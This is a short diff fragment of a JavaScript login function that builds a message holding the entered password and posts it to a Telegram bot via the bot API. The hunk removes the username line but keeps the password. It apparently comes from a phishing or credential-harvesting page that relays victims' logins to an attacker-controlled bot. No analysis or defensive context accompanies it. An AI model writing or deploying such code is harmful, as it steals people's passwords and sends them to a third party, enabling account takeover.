@@ -140,7 +140,6 @@ function login() {
 
     const pesan = `💌 Pesan baru
 
-Nama: ${userid},
 password: ${pw}`;
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
